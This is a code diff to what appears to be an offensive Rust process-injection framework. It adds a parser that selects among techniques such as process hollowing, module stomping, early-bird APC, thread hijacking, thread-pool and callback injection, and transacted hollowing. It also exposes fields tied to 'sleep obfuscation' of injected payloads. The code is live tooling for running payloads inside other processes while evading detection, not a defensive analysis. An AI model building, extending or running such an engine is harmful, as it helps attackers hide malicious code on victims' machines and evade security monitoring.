@@ -572,14 +572,14 @@ pub struct InjectionHandle {
     /// Base address of injected memory in the target process.
     pub injected_base_addr: usize,
     /// Size of the injected payload in bytes.
-    payload_size: usize,
+    pub payload_size: usize,
     /// Thread handle, if the technique created one.  `None` for fire-and-forget
     /// techniques (ThreadPool, FiberInject after switch-back).
     pub thread_handle: Option<*mut c_void>,
     /// Handle to the target process (kept for eject).
     process_handle: *mut c_void,
     /// Whether the injected payload has been enrolled in sleep obfuscation.
-    sleep_enrolled: bool,
+    pub sleep_enrolled: bool,
     /// Address of the sleep stub in the target process (0 if not enrolled).
     sleep_stub_addr: usize,
 }
@@ -7263,7 +7263,9 @@ unsafe fn inject_nt_set_info_process(
     );
 
     if status != 0 || h_proc == 0 {
-        return Err(InjectionError::ProcessNotFound);
+        return Err(InjectionError::ProcessNotFound {
+            name: format!("pid {}", pid),
+        });
     }
 
     // ── Step 2: Allocate RW memory in target process ────────────────────
@@ -9849,6 +9851,158 @@ unsafe fn create_suspended_thread(
     }
 
     Ok(h_thread)
+}
+
+// ── Technique string parser ─────────────────────────────────────────────────
+
+/// Parse a technique name string into an `InjectionTechnique`.
+///
+/// Supported formats:
+///   `"ProcessHollow"`              → `InjectionTechnique::ProcessHollow`
+///   `"ModuleStomp"`                → `InjectionTechnique::ModuleStomp`
+///   `"EarlyBirdApc"`               → `InjectionTechnique::EarlyBirdApc`
+///   `"ThreadHijack"`               → `InjectionTechnique::ThreadHijack`
+///   `"ThreadPool"`                 → `InjectionTechnique::ThreadPool { variant: None }`
+///   `"ThreadPool:Work"`            → `InjectionTechnique::ThreadPool { variant: Some(Work) }`
+///   `"FiberInject"`                → `InjectionTechnique::FiberInject`
+///   `"ContextOnly"`                → `InjectionTechnique::ContextOnly`
+///   `"WaitingThreadHijack"`        → `InjectionTechnique::WaitingThreadHijack { target_pid: 0, target_tid: None }`
+///   `"CallbackInjection"`          → `InjectionTechnique::CallbackInjection { target_pid: 0, api: None }`
+///   `"CallbackInjection:EnumSystemLocalesA"` → specific callback API
+///   `"SectionMapping"`             → `InjectionTechnique::SectionMapping { target_pid: 0, exec_method: None, enhanced: false }`
+///   `"SectionMapping:Direct"`      → specific exec method
+///   `"SectionMapping:Enhanced"`    → enhanced double-mapped variant
+///   `"NtSetInfoProcess"`           → `InjectionTechnique::NtSetInfoProcess { target_pid: 0 }`
+///   `"TransactedHollowing"`        → `InjectionTechnique::TransactedHollowing`
+///   `"DelayedModuleStomp"`         → `InjectionTechnique::DelayedModuleStomp`
+///
+/// `target_pid` fields in the returned technique are set to 0 because the
+/// engine fills in the actual PID during dispatch.
+pub fn parse_technique(name: &str) -> Result<InjectionTechnique, String> {
+    match name {
+        "ProcessHollow" => Ok(InjectionTechnique::ProcessHollow),
+        "ModuleStomp" => Ok(InjectionTechnique::ModuleStomp),
+        "EarlyBirdApc" => Ok(InjectionTechnique::EarlyBirdApc),
+        "ThreadHijack" => Ok(InjectionTechnique::ThreadHijack),
+        "FiberInject" => Ok(InjectionTechnique::FiberInject),
+        "ContextOnly" => Ok(InjectionTechnique::ContextOnly),
+        "TransactedHollowing" => Ok(InjectionTechnique::TransactedHollowing),
+        "DelayedModuleStomp" => Ok(InjectionTechnique::DelayedModuleStomp),
+        "ThreadPool" => Ok(InjectionTechnique::ThreadPool { variant: None }),
+        "WaitingThreadHijack" => Ok(InjectionTechnique::WaitingThreadHijack {
+            target_pid: 0,
+            target_tid: None,
+        }),
+        "CallbackInjection" => Ok(InjectionTechnique::CallbackInjection {
+            target_pid: 0,
+            api: None,
+        }),
+        "SectionMapping" => Ok(InjectionTechnique::SectionMapping {
+            target_pid: 0,
+            exec_method: None,
+            enhanced: false,
+        }),
+        "NtSetInfoProcess" => Ok(InjectionTechnique::NtSetInfoProcess {
+            target_pid: 0,
+        }),
+        s if s.starts_with("ThreadPool:") => {
+            let variant_str = &s["ThreadPool:".len()..];
+            let variant = parse_threadpool_variant(variant_str)?;
+            Ok(InjectionTechnique::ThreadPool {
+                variant: Some(variant),
+            })
+        }
+        s if s.starts_with("CallbackInjection:") => {
+            let api_str = &s["CallbackInjection:".len()..];
+            let api = parse_callback_api(api_str)?;
+            Ok(InjectionTechnique::CallbackInjection {
+                target_pid: 0,
+                api: Some(api),
+            })
+        }
+        s if s.starts_with("SectionMapping:") => {
+            let method_str = &s["SectionMapping:".len()..];
+            if method_str.eq_ignore_ascii_case("enhanced") {
+                Ok(InjectionTechnique::SectionMapping {
+                    target_pid: 0,
+                    exec_method: None,
+                    enhanced: true,
+                })
+            } else {
+                let method = parse_section_exec_method(method_str)?;
+                Ok(InjectionTechnique::SectionMapping {
+                    target_pid: 0,
+                    exec_method: Some(method),
+                    enhanced: false,
+                })
+            }
+        }
+        other => Err(format!(
+            "unknown technique {:?}. Valid: ProcessHollow, ModuleStomp, \
+             EarlyBirdApc, ThreadHijack, ThreadPool[:Variant], FiberInject, \
+             ContextOnly, WaitingThreadHijack, CallbackInjection[:Api], \
+             SectionMapping[:Method|Enhanced], NtSetInfoProcess, \
+             TransactedHollowing, DelayedModuleStomp",
+            other
+        )),
+    }
+}
+
+/// Parse a `ThreadPoolVariant` name string.
+fn parse_threadpool_variant(name: &str) -> Result<ThreadPoolVariant, String> {
+    match name {
+        "Work" => Ok(ThreadPoolVariant::Work),
+        "WorkerFactory" => Ok(ThreadPoolVariant::WorkerFactory),
+        "Timer" => Ok(ThreadPoolVariant::Timer),
+        "IoCompletion" => Ok(ThreadPoolVariant::IoCompletion),
+        "Wait" => Ok(ThreadPoolVariant::Wait),
+        "Alpc" => Ok(ThreadPoolVariant::Alpc),
+        "Direct" => Ok(ThreadPoolVariant::Direct),
+        "AsyncIo" => Ok(ThreadPoolVariant::AsyncIo),
+        other => Err(format!(
+            "unknown ThreadPool variant {:?}. Valid: Work, WorkerFactory, \
+             Timer, IoCompletion, Wait, Alpc, Direct, AsyncIo",
+            other
+        )),
+    }
+}
+
+/// Parse a `CallbackApi` name string.
+fn parse_callback_api(name: &str) -> Result<CallbackApi, String> {
+    match name {
+        "EnumWindows" => Ok(CallbackApi::EnumWindows),
+        "EnumChildWindows" => Ok(CallbackApi::EnumChildWindows),
+        "EnumDesktopWindows" => Ok(CallbackApi::EnumDesktopWindows),
+        "EnumSystemLocalesA" => Ok(CallbackApi::EnumSystemLocalesA),
+        "EnumSystemLocalesW" => Ok(CallbackApi::EnumSystemLocalesW),
+        "EnumFonts" => Ok(CallbackApi::EnumFonts),
+        "EnumResourceTypes" => Ok(CallbackApi::EnumResourceTypes),
+        "EnumResourceNames" => Ok(CallbackApi::EnumResourceNames),
+        "EnumSystemGeoID" => Ok(CallbackApi::EnumSystemGeoID),
+        "EnumDisplayMonitors" => Ok(CallbackApi::EnumDisplayMonitors),
+        "EnumDesktops" => Ok(CallbackApi::EnumDesktops),
+        "EnumWindowStations" => Ok(CallbackApi::EnumWindowStations),
+        other => Err(format!(
+            "unknown CallbackApi {:?}. Valid: EnumWindows, EnumChildWindows, \
+             EnumDesktopWindows, EnumSystemLocalesA, EnumSystemLocalesW, \
+             EnumFonts, EnumResourceTypes, EnumResourceNames, EnumSystemGeoID, \
+             EnumDisplayMonitors, EnumDesktops, EnumWindowStations",
+            other
+        )),
+    }
+}
+
+/// Parse a `SectionExecMethod` name string.
+fn parse_section_exec_method(name: &str) -> Result<SectionExecMethod, String> {
+    match name {
+        "Apc" => Ok(SectionExecMethod::Apc),
+        "Thread" => Ok(SectionExecMethod::Thread),
+        "Callback" => Ok(SectionExecMethod::Callback),
+        other => Err(format!(
+            "unknown SectionExecMethod {:?}. Valid: Apc, Thread, Callback",
+            other
+        )),
+    }
 }
 
 // ── Tests ────────────────────────────────────────────────────────────────────
